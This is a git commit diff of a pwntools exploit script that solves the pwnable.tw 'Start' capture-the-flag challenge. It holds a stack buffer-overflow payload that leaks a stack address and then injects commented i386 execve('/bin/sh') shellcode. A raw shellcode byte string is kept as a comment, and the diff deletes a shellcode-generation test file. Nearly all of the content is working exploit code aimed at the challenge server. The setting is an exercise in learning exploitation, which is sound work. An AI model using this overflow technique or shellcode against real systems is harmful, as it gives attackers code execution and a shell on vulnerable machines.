ebbb191b4c5564e253e3de90676dca30e41e255a
yenchia189929 <jennifer189929@gmail.com>
2022-01-22 17:15:31 +0000

    add comment msg to payload.py

--- pwnabletw/Start/payload.py
+++ pwnabletw/Start/payload.py
@@ -4,12 +4,8 @@ from pwn import *
 context(arch='i386', os='linux')
 
 r = remote('chall.pwnable.tw', 10000)
+#r = process("start")
 
-
-#payload = b'a' * 0x14
-#payload += asm('''
-#	mov esp, ecx
-#''')
 
 payload = b'a' * 0x14 + p32(0x8048087)
 
@@ -20,8 +16,28 @@ print(hex(leak))
 
 
 payload = b'a' * 0x14 + p32(leak + 0x14)
-payload += b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x00'
-#payload += asm(shellcraft.sh())
+
+# shellcode
+# xor eax, eax : erase eax register
+# mov ebx, esp : point to /bin/sh 
+# mov al, 0xb  : system call to execve's opcode
+shellcode = asm('''				
+	xor eax, eax					
+	push eax
+	push %s
+	push %s
+	mov ebx, esp
+	xor ecx, ecx
+	xor edx, edx
+	mov al, 0xb
+	int 0x80
+'''%(u32("/sh\0"), u32("/bin")))
+
+# shellcode online:
+# shellcode= b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x00'		
+
+payload += shellcode
+
 
 r.send(payload)
 
--- pwnabletw/Start/test.py
+++
@@ -1,7 +0,0 @@
-#!/usr/bin/python3
-from pwn import *
-
-s = asm(shellcraft.i386.linux.sh())
-print(s)
-
-
